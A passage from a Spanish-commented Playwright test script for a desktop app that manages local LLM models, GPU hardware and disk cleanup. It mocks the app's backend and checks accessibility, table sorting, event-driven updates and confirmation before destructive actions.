            copia_patron: "/home/usuario/.gentle-shell/agent/models.json.bak-AAAAAMMDD-HHMMSS",
          };
        }

        if (cmd === "action:run") {
          const kind = args.aj?.kind;
          const a = args.aj?.args ?? {};
          if (kind === "llmfit:medir") {
            const etiqueta = a.todos ? "todos los del servidor" : a.modelo;
            // Se guarda en el histórico igual que lo hace el backend: runtime
            // `llmfit (proveedor)`, para que se distinga de un llama-bench.
            datos["benchmarks:recent"].unshift({
              ts: Math.floor(Date.now() / 1000),
              modelo: a.modelo ?? "",
              runtime: `llmfit (${a.provider})`,
              tipo: "decode",
              n_prompt: 512,
              n_gen: 128,
              tok_s: 41.2,
              desviacion: 0.8,
              build: "llmfit 0.4.2",
              gpu: "AMD Radeon RX 6800 XT",
            });
            return `medido sirviendo (${etiqueta}): 41.2 tok/s de generación, 3 pasadas`;
          }
          // Almacenamiento y optimización: el backend devuelve el mensaje ya
          // redactado, así que aquí se replica el suyo para que la interfaz tenga
          // algo real que enseñar.
          if (kind === "almacen:borrar") {
            const rutas = a.rutas ?? [];
            return a.definitivo
              ? `${rutas.length} de ${rutas.length} elementos borrados definitivamente; 3.0 GB liberados`
              : `${rutas.length} de ${rutas.length} elementos movidos a la papelera; 3.0 GB a la papelera (ese espacio no se libera hasta vaciarla)`;
          }
          if (kind === "limpieza:limpiar") {
            const ids = a.ids ?? [];
            return `29.5 GB liberados en 73692 elementos (${ids.length} objetivos). 1 saltados`;
          }
          if (kind === "arranque:activar") {
            return `${a.id}: ${a.activo ? "vuelve a arrancar con la sesión" : "desactivado (se puede reactivar)"}`;
          }
          if (kind === "papelera:vaciar") {
            return "Papelera vaciada: 75 elementos, 220.0 MB liberados.";
          }
          if (kind === "copias:restaurar") {
            return `Restaurado /home/usuario/.pi/agent/models.json desde la copia y comprobado releyendo. Lo que había antes quedó en /home/usuario/.pi/agent/models.json.bak-20261003-140000`;
          }
          if (kind === "copias:borrar") {
            return "Copia borrada (el original no se ha tocado).";
          }
          if (kind === "update:run") {
            return `comando terminado: ${a.cmd}`;
          }
          throw new Error(`acción no simulada: ${kind}`);
        }

        // El árbol del analizador depende de la carpeta pedida: sin eso la prueba
        // no podría demostrar que bajar a una carpeta cambia lo que se analiza.
        if (cmd === "almacen:arbol") {
          const raiz = (args.args ?? {}).raiz ?? "/home/usuario";
          if (raiz !== "/home/usuario") {
            return {
              ruta: raiz,
              bytes: 65_000_000_000,
              ficheros: 2,
              dirs: 0,
              hijos: [
                { ruta: `${raiz}/share`, nombre: "share", bytes: 64_000_000_000, ficheros: 299_000, dirs: 39_000, es_dir: true, modificado: 1758990000 },
                { ruta: `${raiz}/nota.txt`, nombre: "nota.txt", bytes: 2048, ficheros: 1, dirs: 0, es_dir: false, modificado: 1758700000 },
              ],
              resto_n: 0,
              resto_bytes: 0,
              truncado: false,
              omitidos: 0,
              entradas: 3,
              ms: 120,
              // Sin exclusiones actuando: aquí NO se añade nada a la pantalla.
              excluidos: [],
            };
          }
          return JSON.parse(JSON.stringify(datos["almacen:arbol"]));
        }
        if (cmd === "almacen:buscar") {
          const q = String((args.args ?? {}).consulta ?? "").toLowerCase();
          return JSON.parse(JSON.stringify(datos["almacen:buscar"])).filter((c) =>
            c.nombre.toLowerCase().includes(q),
          );
        }

        // La puerta de enlace: la prueba puede cambiar si se exige clave, para
        // poder comprobar los dos avisos (con clave y sin ella) sin dos arneses.
        if (cmd === "gateway:estado") {
          const estado = JSON.parse(JSON.stringify(datos[cmd]));
          if (typeof window.__mockRequiereClave === "boolean") {
            estado.requiere_clave = window.__mockRequiereClave;
          }
          return estado;
        }
        // El escaneo REAL filtra por categoría en el backend, así que el simulador
        // también: si no, la sección de Seguridad (que pide solo `privacidad`)
        // enseñaría también las cachés, y la prueba estaría midiendo otra pantalla.
        if (cmd === "limpieza:escanear") {
          const cats = (args.args ?? {}).categorias ?? [];
          const todos = JSON.parse(JSON.stringify(datos["limpieza:escanear"]));
          if (cats.length === 0) return todos;
          return { ...todos, objetivos: todos.objetivos.filter((o) => cats.includes(o.categoria)) };
        }
        // Las exclusiones se añaden y se quitan DE VERDAD en el simulador: la
        // prueba comprueba el viaje completo (añadir, verlo resuelto, quitarlo).
        if (cmd === "exclusiones:listar") {
          return JSON.parse(JSON.stringify(datos["exclusiones:listar"]));
        }
        if (cmd === "exclusiones:anadir" || cmd === "exclusiones:quitar") {
          const p = String((args.args ?? {}).patron ?? "");
          const d = datos["exclusiones:listar"];
          if (cmd === "exclusiones:anadir") {
            if (d.guardadas.some((x) => x.patron === p)) throw new Error(`«${p}» ya estaba en la lista`);
            d.guardadas.unshift({ patron: p, ts: Math.floor(Date.now() / 1000) });
            d.vigentes.unshift({
              patron: p,
              descripcion: `${p} → /home/usuario/VMs`,
              resuelta: "/home/usuario/VMs",
            });
            return `Excluido «${p}» (/home/usuario/VMs)`;
          }
          const i = d.guardadas.findIndex((x) => x.patron === p);
          if (i < 0) throw new Error(`«${p}» no estaba en la lista`);
          d.guardadas.splice(i, 1);
          d.vigentes = d.vigentes.filter((x) => x.patron !== p);
          return `Quitada la exclusión «${p}»`;
        }
        // La provisión es ESTATAL: «Preparar todo» instala lo que falta y la
        // tarjeta tiene que reflejarlo al releer. Así la prueba comprueba el viaje
        // completo (falta → listo) y no solo el botón.
        if (cmd === "provision:estado") {
          return JSON.parse(JSON.stringify(datos["provision:estado"]));
        }
        if (cmd === "provision:instalar") {
          const est = datos["provision:estado"];
          const pendientes = est.herramientas.filter((h) => h.instalable && h.estado !== "listo");
          for (const h of pendientes) {
            h.estado = "listo";
            h.ruta = `/home/usuario/.local/share/machinograph/bin/${h.id}/binario`;
            h.version = h.id === "llama.cpp" ? "llama-bench b11375" : "1.0.0";
          }
          return `Instaladas ${pendientes.length} de ${pendientes.length}: ${pendientes.map((h) => h.nombre).join(", ")}. 1 necesita root (amd-smi).`;
        }
        if (cmd === "provision:reparar") {
          return "Todo lo que se puede instalar está listo; 1 herramienta necesita root (amd-smi).";
        }
        if (cmd === "provision:cancelar") {
          return "No había ninguna instalación en curso.";
        }
        if (cmd === "provision:auto") {
          const a = args.args ?? {};
          if (typeof a.activo === "boolean") datos["provision:auto"] = a.activo;
          datos["provision:estado"].auto_provision = datos["provision:auto"];
          return datos["provision:auto"];
        }
        if (cmd in datos) return JSON.parse(JSON.stringify(datos[cmd]));
        throw new Error(`comando no simulado: ${cmd}`);
      },
    };
    window.__TAURI_EVENT_PLUGIN_INTERNALS__ = { unregisterListener() {} };
    // Equivale al `app.emit(...)` del backend Rust.
    window.__emitir__ = (evento, payload) => {
      for (const { event, cb } of eventos.values()) {
        if (event === evento && cb) cb({ event: evento, id: 0, payload });
      }
    };
  },
  { datos, log },
);

page.on("pageerror", (e) => res.push({ ok: false, nombre: "excepción en la página", detalle: e.message }));
page.on("console", (m) => {
  // Un 404 de recurso no es un error de la interfaz: se apunta en `recursos404`
  // y se informa aparte. Cualquier otra cosa (incluido un error de React) cuenta.
  if (m.type() === "error" && !/Failed to load resource.*404/.test(m.text())) {
    res.push({ ok: false, nombre: "error de consola", detalle: m.text() });
  }
});
// El 404 del favicon no es de la interfaz (index.html no es de este alcance):
// se registra aparte para poder decirlo en el informe, sin contar como fallo.
const recursos404 = [];
page.on("response", (r) => {
  if (r.status() === 404) recursos404.push(r.url());
});

await page.goto(URL_APP, { waitUntil: "load" });
await page.waitForSelector('nav[aria-label="Secciones"]', { timeout: 10000 });

/* 1. Enlace de salto: primero enfocable y visible al enfocar ------------------ */
await t("1. Enlace de salto: primer elemento enfocable y visible al enfocar", async () => {
  const info = await page.evaluate(() => {
    const a = document.querySelector('a[href="#contenido"]');
    if (!a) return null;
    const enfocables = [
      ...document.querySelectorAll('a[href], button, input, select, textarea, [tabindex]:not([tabindex="-1"])'),
    ].filter((el) => el.offsetParent !== null || el === a);
    const antes = document.activeElement;
    a.focus();
    const r = a.getBoundingClientRect();
    const visible = r.width > 0 && r.height > 0 && getComputedStyle(a).clipPath === "none";
    const texto = a.innerText.trim();
    a.blur();
    antes?.focus?.();
    return { primero: enfocables[0] === a, visible, texto };
  });
  if (!info) fallo("no existe el enlace de salto");
  if (!info.primero) fallo("el enlace de salto no es el primer elemento enfocable");
  if (!info.visible) fallo("el enlace de salto no se ve al recibir el foco");
  return `"${info.texto}" / primero y visible`;
});

/* 2. Región de contenido + foco al cambiar de sección ------------------------ */
await t("2. El foco va al contenido al cambiar de sección", async () => {
  const region = await page.evaluate(() => {
    const m = document.querySelector("main#contenido");
    return m
      ? { tabindex: m.getAttribute("tabindex"), labelledby: m.getAttribute("aria-labelledby"), existe: !!document.getElementById("titulo-seccion") }
      : null;
  });
  if (!region) fallo("no existe main#contenido");
  if (region.tabindex !== "-1") fallo(`tabindex=${region.tabindex}, se esperaba -1`);
  if (region.labelledby !== "titulo-seccion" || !region.existe) fallo("aria-labelledby no apunta a un h2/h1 existente");

  await irA(page, "Hardware");
  const donde = await page.evaluate(() => document.activeElement?.id ?? document.activeElement?.tagName);
  if (donde !== "contenido") fallo(`el foco quedó en ${donde}, no en el contenido`);
  const titulo = await page.evaluate(() => document.getElementById("titulo-seccion")?.innerText);
  return `main[tabindex=-1][aria-labelledby] y foco en #contenido · título "${titulo}"`;
});

/* 3. Modelos: encaje automático visible sin pulsar nada --------------------- */
await t("3. El encaje se ve SIN pulsar nada, con runtime y antigüedad", async () => {
  await irA(page, "En disco");
  await page.waitForSelector("tbody tr");
  const filas = await page.$$eval("tbody tr", (fs) =>
    fs.map((f) => f.innerText.replace(/\s+/g, " ")),
  );
  if (filas.length !== 20) fallo(`se esperaban 20 filas, hay ${filas.length}`);
  const qwen = filas.find((x) => x.includes("qwen2.5-32b"));
  if (!qwen) fallo("no aparece la fila del 32B");
  for (const trozo of ["cabe en la GPU", "262144", "vulkan", "hace 4 min"]) {
    if (!qwen.includes(trozo)) fallo(`la fila del 32B no dice "${trozo}": ${qwen}`);
  }
  if (qwen.includes("desfasado")) fallo("el encaje de hace 4 min no debería marcarse desfasado");
  const coder = filas.find((x) => x.includes("qwen2.5-coder-7b"));
  if (!coder?.includes("desfasado")) fallo(`el encaje de hace 2 h debería marcarse desfasado: ${coder}`);
  const error = filas.find((x) => x.includes("modelo-8b"));
  if (!error?.includes("no se pudo calcular")) fallo(`el Error no se enseña como tal: ${error}`);
  if (!error?.includes("ningún runtime supo leer")) fallo(`el Error no enseña su motivo: ${error}`);
  const mixto = filas.find((x) => x.includes("mimo-9b"));
  if (!mixto?.includes("mixto")) fallo(`el Mixto no se distingue de Gpu: ${mixto}`);
  const nocabe = filas.find((x) => x.includes("modelo-27b"));
  if (!nocabe?.includes("no cabe") || !nocabe?.includes("entran 16384 de 262144")) {
    fallo(`el NoCabe no dice qué entra y qué se pidió: ${nocabe}`);
  }
  const sinFit = filas.find((x) => x.includes("llama-3.2-3b"));
  if (!sinFit?.includes("sin calcular")) fallo(`un modelo sin fila debería decir "sin calcular": ${sinFit}`);

  // Formato y cuantización van en la MISMA celda (3.ª columna), y el "—" es para
  // los formatos donde no hay cuantización que deducir: un .safetensors no la
  // lleva en el nombre, así que poner "desconocida" sería afirmar un dato que no
  // existe.
  const formato = await page.$$eval("tbody tr", (fs) =>
    fs.map((f) => ({
      nombre: f.querySelector("td")?.innerText.trim() ?? "",
      celda: f.querySelector("td:nth-child(3)")?.innerText.trim() ?? "",
    })),
  );
  const q27 = formato.find((x) => x.nombre.startsWith("modelo-27b"));
  if (q27?.celda !== "GGUF · PQ2_0") fallo(`el .gguf no enseña su cuantización: ${JSON.stringify(q27)}`);
  const qSafe = formato.find((x) => x.nombre.includes("sdxl-base"));
  if (qSafe?.celda !== "safetensors · —") fallo(`un .safetensors debe enseñar "—", no "desconocida": ${JSON.stringify(qSafe)}`);

  // Densidad: una celda de encaje de tres líneas hacía filas de 130px y la tabla
  // dejaba de ser escaneable (DESIGN §1). Se mide, no se supone.
  const alto = await page.$$eval("tbody tr", (fs) =>
    Math.max(...fs.map((f) => f.getBoundingClientRect().height)),
  );
  if (process.env.DIAG) {
    const diag = await page.evaluate(() => {
      const filas = [...document.querySelectorAll("tbody tr")];
      const peor = filas.find((f) => Math.round(f.getBoundingClientRect().height) === Math.max(...filas.map((x) => Math.round(x.getBoundingClientRect().height))));
      const alto = () => Math.round(peor.getBoundingClientRect().height);
      const base = alto();
      const prueba = [...peor.querySelectorAll("td")].map((td, i) => {
        const antes = td.style.display;
        td.style.display = "none";
        const h = alto();
        td.style.display = antes;
        return `td#${i} ${td.innerText.trim().slice(0, 14).replace(/\s+/g, " ")}: ${h}`;
      });
      return { fila: peor.innerText.split("\n")[0], base, prueba };
    });
    console.log("DIAG fila más alta:", JSON.stringify(diag, null, 1));
  }
  if (alto > 68) fallo(`filas demasiado altas para ser densas: ${Math.round(alto)}px`);
  const lineasEncaje = await page.$$eval("tbody tr td:nth-child(6)", (ts) =>
    Math.max(...ts.map((td) => td.querySelectorAll("div > *").length)),
  );
  if (lineasEncaje > 2) fallo(`la celda de encaje tiene ${lineasEncaje} líneas, se esperaban 2 como mucho`);
  return `20 filas (máx. ${Math.round(alto)}px, encaje en ${lineasEncaje} líneas) · Gpu/Mixto/NoCabe/Error + motivo + «hace 4 min»`;
});

/* 4. Tablas: aria-sort y orden real ----------------------------------------- */
await t("4. Modelos ordena de verdad y aria-sort lo refleja", async () => {
  const inicial = await page.$$eval("th[aria-sort]", (ths) =>
    ths.filter((t) => t.getAttribute("aria-sort") !== "none").map((t) => `${t.innerText.trim()}=${t.getAttribute("aria-sort")}`),
  );
  if (inicial.length !== 1 || inicial[0] !== "Tamaño=descending") {
    fallo(`estado inicial inesperado: ${JSON.stringify(inicial)}`);
  }
  const antes = await columna0(page);

  await pulsar(page, 'th:has(button:text-is("Nombre")) button');
  if ((await ariaSort(page, "Nombre")) !== "ascending") fallo("Nombre no quedó en ascending");
  if ((await ariaSort(page, "Tamaño")) !== "none") fallo("Tamaño sigue marcado como ordenado");
  const asc = await columna0(page);
  if (asc[0].localeCompare(asc[1]) > 0) fallo(`no está en orden ascendente: ${asc.slice(0, 3)}`);
  if (JSON.stringify(asc) === JSON.stringify(antes)) fallo("las filas no se reordenaron");

  await pulsar(page, 'th:has(button:text-is("Nombre")) button');
  if ((await ariaSort(page, "Nombre")) !== "descending") fallo("el segundo clic no invirtió el sentido");
  const desc = await columna0(page);
  if (JSON.stringify([...desc].reverse()) !== JSON.stringify(asc)) fallo("desc no es el inverso de asc");

  await pulsar(page, 'th:has(button:text-is("Encaje")) button');
  if ((await ariaSort(page, "Encaje")) !== "descending") fallo("Encaje no empezó por descendente");
  const porEncaje = await page.$$eval("tbody tr", (fs) => fs.map((f) => f.innerText.replace(/\s+/g, " ")));
  const iGpu = porEncaje.findIndex((x) => x.includes("cabe en la GPU"));
  const iError = porEncaje.findIndex((x) => x.includes("no se pudo calcular"));
  const iSin = porEncaje.findIndex((x) => x.includes("sin calcular"));
  if (!(iGpu < iError && iError < iSin)) fallo(`orden por encaje mal: gpu=${iGpu} error=${iError} sin=${iSin}`);

  await pulsar(page, 'th:has(button:text-is("Tamaño")) button');
  if ((await ariaSort(page, "Tamaño")) !== "descending") fallo("Tamaño no empezó por descendente");
  const porTamano = await page.$$eval("tbody tr td:nth-child(4)", (ts) => ts.map((x) => x.innerText.trim()));
  if (porTamano[0] !== "26.1 GB") fallo(`el mayor no va primero: ${porTamano.slice(0, 3)}`);

  /* Formato (con su cuantización dentro) es columna propia, ordenable y con
     aria-sort. El "—" de los formatos sin cuantización se va al final EN LOS DOS
     sentidos, porque no es una cuantización más. */
  await pulsar(page, 'th:has(button:text-is("Formato")) button');
  if ((await ariaSort(page, "Formato")) !== "ascending") fallo("Formato no ordena ascendente al primer clic");
  const quantAsc = await page.$$eval("tbody tr td:nth-child(3)", (ts) => ts.map((x) => x.innerText.trim()));
  if (!quantAsc[quantAsc.length - 1].endsWith("—")) fallo(`los sin cuantización no van al final: ${quantAsc.slice(-3)}`);
  if (quantAsc.slice(0, 3).some((q) => q.endsWith("—"))) fallo(`hay un "—" ordenado entre valores: ${quantAsc.slice(0, 5)}`);
  const reales = quantAsc.filter((q) => !q.endsWith("—"));
  if (!reales.some((q) => q.includes("PQ2_0")) || !reales.some((q) => q.includes("Q8_0")) || !reales.some((q) => q.includes("F16"))) {
    fallo(`faltan cuantizaciones deducidas (PQ2_0/Q8_0/F16): ${reales}`);
  }
  if (reales.length !== 6) fallo(`se esperaban 6 .gguf con cuantización, hay ${reales.length}: ${reales}`);
  await pulsar(page, 'th:has(button:text-is("Formato")) button');
  if ((await ariaSort(page, "Formato")) !== "descending") fallo("el segundo clic no invirtió Formato");
  const quantDesc = await page.$$eval("tbody tr td:nth-child(3)", (ts) => ts.map((x) => x.innerText.trim()));
  if (!quantDesc[quantDesc.length - 1].endsWith("—")) fallo("en descendente los sin dato también deben ir al final");
  // Los valores REALES tienen que ser el inverso; los "—" no cuentan, porque van
  // siempre al final en los dos sentidos.
  const [ascVals, descVals] = [quantAsc, quantDesc].map((c) => c.filter((q) => !q.endsWith("—")));
  if (JSON.stringify([...descVals].reverse()) !== JSON.stringify(ascVals)) {
    fallo(`desc no es el inverso de asc: ${ascVals} vs ${descVals}`);
  }

  await pulsar(page, 'th:has(button:text-is("Tamaño")) button');
  if ((await ariaSort(page, "Tamaño")) !== "descending") fallo("Tamaño no empezó por descendente");
  return `Tamaño/Nombre/Encaje/Formato ordenan de verdad · la cuantización (${reales.length} .gguf) va antes que los "—" en los dos sentidos`;
});

/* 5. Filtros, búsqueda y orden sobreviven a cambiar de sección --------------- */
await t("5. Filtros + búsqueda + orden sobreviven a salir y volver", async () => {
  await page.fill('input[aria-label="Buscar modelos"]', "p");
  await page.selectOption("select >> nth=0", "texto");
  // Se ordena por «Modificado»: la columna «Familia» ya no existe (su dato va
  // dentro de la celda del nombre, que es contexto y no un criterio de orden).
  await pulsar(page, 'th:has(button:text-is("Modificado")) button');
  const estadoAntes = await page.evaluate(() => ({
    q: document.querySelector('input[aria-label="Buscar modelos"]').value,
    tipo: document.querySelectorAll("select")[0].value,
    orden: [...document.querySelectorAll("th[aria-sort]")]
      .filter((t) => t.getAttribute("aria-sort") !== "none")
      .map((t) => `${t.innerText.trim()}=${t.getAttribute("aria-sort")}`),
    filas: document.querySelectorAll("tbody tr").length,
  }));
  await irA(page, "Inicio");
  await irA(page, "En disco");
  const estadoDespues = await page.evaluate(() => ({
    q: document.querySelector('input[aria-label="Buscar modelos"]').value,
    tipo: document.querySelectorAll("select")[0].value,
    orden: [...document.querySelectorAll("th[aria-sort]")]
      .filter((t) => t.getAttribute("aria-sort") !== "none")
      .map((t) => `${t.innerText.trim()}=${t.getAttribute("aria-sort")}`),
    filas: document.querySelectorAll("tbody tr").length,
  }));
  if (JSON.stringify(estadoAntes) !== JSON.stringify(estadoDespues)) {
    fallo(`no se conservó: antes ${JSON.stringify(estadoAntes)} / después ${JSON.stringify(estadoDespues)}`);
  }
  if (estadoDespues.filas === 0) fallo("el filtro dejó la tabla vacía, no sirve de prueba");
  await page.click('button:text-is("Limpiar filtros")');
  await page.waitForTimeout(100);
  const limpio = await page.evaluate(() => ({
    q: document.querySelector('input[aria-label="Buscar modelos"]').value,
    filas: document.querySelectorAll("tbody tr").length,
  }));
  if (limpio.q !== "" || limpio.filas !== 20) fallo(`Limpiar filtros no limpió: ${JSON.stringify(limpio)}`);
  return `${estadoDespues.filas} filas · mismo q/tipo/aria-sort tras ir a Dashboard y volver`;
});

/* 6. Evento ai:fit: refresca sin pulsar nada -------------------------------- */
await t("6. El evento ai:fit actualiza la fila sin tocar nada", async () => {
  // Se parte de la tabla SIN filtros (el test 5 deja uno puesto a propósito).
  await irA(page, "En disco");
  const limpiar = await page.$('button:text-is("Limpiar filtros")');
  if (limpiar) {
    await limpiar.click();
    await page.waitForTimeout(120);
  }
  await esperar(page, () => document.querySelectorAll("tbody tr").length === 20, "las 20 filas sin filtro");
  const antes = await page.$$eval("tbody tr", (fs) =>
    fs.map((f) => f.innerText.replace(/\s+/g, " ")).find((x) => x.includes("llama-3.2-3b")),
  );
  if (!antes?.includes("sin calcular")) fallo(`la fila debería empezar sin encaje: ${antes}`);
  await page.evaluate(
    (payload) => window.__emitir__("ai:fit", payload),
    {
      modelo: R("llama-3.2-3b-q4_k_m.gguf"),
      runtime: "vulkan",
      ctx_max: 40960,
      ngl: -1,
      encaje: "Gpu",
      pedido: null,
      detalle: "cabe entero en la GPU: 40960 de contexto con todas las capas en la GPU",
      ts: Math.floor(Date.now() / 1000) - 5,
    },
  );
  await page.waitForTimeout(250);
  const fila = await page.$$eval("tbody tr", (fs) =>
    fs.map((f) => f.innerText.replace(/\s+/g, " ")).find((x) => x.includes("llama-3.2-3b")),
  );
  if (!fila?.includes("cabe en la GPU") || !fila?.includes("40960")) {
    fallo(`la fila no se refrescó con el evento: ${fila}`);
  }
  const otras = await page.$$eval("tbody tr", (fs) =>
    fs.map((f) => f.innerText.replace(/\s+/g, " ")).find((x) => x.includes("qwen2.5-32b")),
  );
  if (!otras?.includes("262144")) fallo("el evento de un modelo tocó a otro");
  return "un `ai:fit` cambia su celda (de «sin calcular» a «cabe en la GPU») sin tocar las demás";
});

/* 7. Hardware: el reloj de memoria y la confirmación de lo destructivo ------- */
await t("7. Hardware enseña el reloj de memoria y confirma antes de matar", async () => {
  await irA(page, "Hardware");
  await page.waitForSelector("main#contenido");

  // El reloj de memoria: el nivel activo, TODOS los niveles de la tarjeta y el
  // veredicto del backend. No basta con que el dato exista: tiene que verse de
  // qué escala sale (96 es el mínimo de esta tarjeta, no un número suelto).
  const mclk = await page.evaluate(() => {
    const niveles = [...document.querySelectorAll("main#contenido ul[aria-label*='Niveles de reloj'] li")];
    return {
      niveles: niveles.map((li) => li.innerText.replace(/\s+/g, " ")),
      activo: niveles.find((li) => li.innerText.includes("activo"))?.innerText.replace(/\s+/g, " ") ?? "",
      texto: document.getElementById("contenido")?.innerText ?? "",
    };
  });
  if (mclk.niveles.length !== 3) fallo(`se esperaban 3 niveles de MCLK, hay ${mclk.niveles.length}`);
  if (!mclk.activo.includes("96 MHz")) fallo(`el nivel activo no se marca: ${JSON.stringify(mclk.activo)}`);
  if (!mclk.texto.includes("más lentos")) fallo("no se enseña el veredicto del reloj de memoria");

  // Y el aviso con los DOS remedios, con el suave (acento) primero: es el que se
  // midió que funciona y no pierde la VRAM.
  const acciones = await page.evaluate(() =>
    [...document.querySelectorAll("main#contenido button")].map((b) => b.innerText.trim()),
  );
  const iArreglar = acciones.findIndex((t) => t.startsWith("Arreglar"));
  const iReiniciar = acciones.findIndex((t) => t.startsWith("Reiniciar"));
  if (iArreglar === -1 || iReiniciar === -1) fallo(`faltan los remedios del MCLK: ${acciones.join(" | ")}`);
  if (iArreglar > iReiniciar) fallo("el remedio brusco va antes que el suave");

  // Matar un proceso NO se puede deshacer: el primer clic no lanza nada y avisa.
  const antes = await page.evaluate(() => window.__LLAMADAS__.filter((l) => l.cmd === "action:run").length);
  await pulsar(page, 'button[aria-label^="Terminar el proceso 4242"]');
  const tras1 = await page.evaluate(() => window.__LLAMADAS__.filter((l) => l.cmd === "action:run").length);
  const aviso = await page.evaluate(() => document.body.innerText.includes("No se puede deshacer"));
  if (tras1 !== antes) fallo("el primer clic ya lanzó la acción: no hay confirmación");
  if (!aviso) fallo("no se avisa de que no se puede deshacer");
  await pulsar(page, 'button:text-is("No")');
  const sigue = await page.evaluate(() => !!document.querySelector('button[aria-label^="Terminar el proceso 4242"]'));
  if (!sigue) fallo("«No» no volvió al estado anterior ni relanzó nada");

  return `MCLK con sus ${mclk.niveles.length} niveles y el activo marcado · remedios en orden · matar en 2 pasos (0 acciones al primer clic)`;
});


/* 8. Servidores: el panel de log con el log REAL ---------------------------- */
await t("8. Servidores: log real de llama-swap, con niveles distinguidos", async () => {
  if (logCompleto === null) {
    // Sin llama-swap no hay log real que enseñar, y este arnés NO se inventa uno:
    // se dice que no se puede comprobar, en vez de dar por bueno un log de mentira.
    return "OMITIDA: no hay llama-swap escuchando en 127.0.0.1:8080";
  }
  await irA(page, "Servidores");
  await page.waitForSelector("text=llama-swap");
  const antes = await page.evaluate(() => window.__LLAMADAS__.filter((l) => l.cmd === "swap:logs").length);
  await pulsar(page, 'button[aria-label^="Ver el log del motor"]');

  const args = await page.evaluate(
    () => window.__LLAMADAS__.filter((l) => l.cmd === "swap:logs").map((l) => l.args),
  );
  if (args.length !== antes + 1) fallo(`se pidió el log ${args.length - antes} veces al abrir, se esperaba 1`);
  if (JSON.stringify(args.at(-1)) !== JSON.stringify({ args: { port: 8080, lineas: 300 } })) {
    fallo(`los argumentos no son los del contrato: ${JSON.stringify(args.at(-1))}`);
  }
  const panel = await page.evaluate(() => {
    const ul = document.querySelector("#log-motor-8080 ul");
    if (!ul) return null;
    const lis = [...ul.querySelectorAll("li")];
    return {
      total: lis.length,
      primera: lis[0]?.innerText ?? "",
      info: lis.filter((l) => l.innerText.includes("[INFO]")).length,
      warn: lis.filter((l) => l.innerText.includes("[WARN]")).length,
      // Se distingue por TEXTO y por ICONO, no solo por color.
      warnConIcono: lis.filter((l) => l.innerText.includes("[WARN]") && l.querySelector("svg")).length,
      claseWarn: lis.filter((l) => l.innerText.includes("[WARN]")).every((l) => l.className.includes("text-warn")),
      textoWarn: lis.find((l) => l.innerText.includes("[WARN]"))?.innerText ?? "",
      err: lis.filter((l) => l.innerText.includes("[ERROR]")).length,
      errConIcono: lis.filter((l) => l.innerText.includes("[ERROR]") && l.querySelector("svg")).length,
      claseErr: lis.filter((l) => l.innerText.includes("[ERROR]")).every((l) => l.className.includes("text-bad")),
      errDistintaDeInfo: (() => {
        const e = lis.find((l) => l.innerText.includes("[ERROR]"));
        const i = lis.find((l) => l.innerText.includes("[INFO]"));
        return Boolean(e && i && e.className !== i.className && e.querySelector("svg") && !i.querySelector("svg"));
      })(),
      autoMarcado: document.querySelector("#log-motor-8080")?.querySelector('input[type="checkbox"]')?.checked,
    };
  });
  if (!panel) fallo("no se pintó el panel del log");
  if (panel.total === 0) fallo("el panel no pintó ninguna línea");
  if (panel.info === 0) fallo("no hay líneas [INFO] reales pintadas");
  if (panel.warn === 0) fallo("no se pintó la línea [WARN] real del log de llama-swap");
  if (panel.warnConIcono !== panel.warn) fallo("el [WARN] no lleva icono (solo se distinguiría por color)");
  if (!panel.claseWarn) fallo("el [WARN] no lleva el tono de aviso");
  if (panel.err !== 1 || panel.errConIcono !== 1 || !panel.claseErr) {
    fallo(`el [ERROR] no se distingue: ${JSON.stringify({ err: panel.err, conIcono: panel.errConIcono, clase: panel.claseErr })}`);
  }
  if (!panel.errDistintaDeInfo) fallo("una línea de error se pinta igual que una informativa");
  if (panel.autoMarcado !== false) fallo("el refresco automático viene marcado: no es opcional");

  // Sin refresco automático, seguir pulsando nada no debe pedir el log en bucle.
  await page.waitForTimeout(2500);
  const despues = await page.evaluate(() => window.__LLAMADAS__.filter((l) => l.cmd === "swap:logs").length);
  if (despues !== args.length) fallo(`el log se pidió ${despues - args.length} veces sin tocar nada`);
  const detalleAviso = warnReal
    ? "el aviso es una línea REAL del log, que en el fichero completo está fuera de las últimas 300"
    : "el aviso es sintético: el log real no tiene ninguno ahora mismo";
  return `${panel.total} líneas de /logs real (${panel.info} INFO, ${panel.warn} WARN; ${detalleAviso}) + [ERROR] sintético · 1 petición al abrir · sin bucle`;
});

/* 9. No hay scroll horizontal de página a 960×640 --------------------------- */
await t("9. Sin scroll horizontal de página a 960×640 en ninguna sección", async () => {
  const cdp = await contexto.newCDPSession(page);
  await cdp.send("Emulation.setDeviceMetricsOverride", {
    width: 960,
    height: 640,
    deviceScaleFactor: 1,
    mobile: false,
  });
  const SECCIONES = [
    "Inicio",
    "Descubrir",
    "En disco",
    "Rendimiento",
    "Servidores",
    "Uso",
    "Conexiones",
    "Hardware",
    "Pantalla",
    "Almacenamiento",
    "Optimización",
    "Seguridad",
    "Diagnóstico",
    "Mantenimiento",
    "Ajustes",
  ];
  const malas = [];
  for (const seccion of SECCIONES) {
    await irA(page, seccion);
    await page.waitForTimeout(120);
    const m = await page.evaluate(() => ({
      doc: document.documentElement.scrollWidth,
      cli: document.documentElement.clientWidth,
      body: document.body.scrollWidth,
    }));
    if (m.doc > m.cli + 1 || m.body > m.cli + 1) malas.push(`${seccion} (${m.doc}/${m.cli})`);
  }
  await cdp.send("Emulation.clearDeviceMetricsOverride");
  if (malas.length > 0) fallo(`hay scroll horizontal en: ${malas.join(", ")}`);
  return `${SECCIONES.length} secciones a 960×640 sin desbordar la página`;
});

/* 10. Recomendados: orden por cabecera ------------------------------------- */
await t("10. Descubrir ordena por cabecera (ajuste, nota, params, tok/s)", async () => {
  await irA(page, "Descubrir");
  await page.waitForSelector("tbody tr");
  // Abre ordenada por «Ajuste»: es la puntuación con el deslizador, o sea «lo
  // mejor para tu equipo con lo que has pedido», que es lo que se busca aquí.
  if ((await ariaSort(page, "Ajuste")) !== "descending") fallo("el ajuste no está ordenado al abrir");
  const ajustes = await page.$$eval("tbody tr td:nth-last-child(3)", (ts) => ts.map((x) => parseFloat(x.innerText.trim())));
  for (let i = 1; i < ajustes.length; i++) {
    if (Number.isFinite(ajustes[i - 1]) && Number.isFinite(ajustes[i]) && ajustes[i - 1] < ajustes[i]) {
      fallo(`el ajuste no va de mayor a menor: ${ajustes}`);
    }
  }
  // Y al pulsar «Nota» ordena por la nota de llmfit, que es otro criterio.
  await pulsar(page, 'th:has(button:text-is("Nota")) button');
  if ((await ariaSort(page, "Nota")) !== "descending") fallo("la nota no ordena descendente al pulsarla");
  // La nota es la penúltima columna de datos (después del ajuste y antes de las
  // acciones): se cuenta desde el final para que añadir columnas delante no
  // rompa la comprobación.
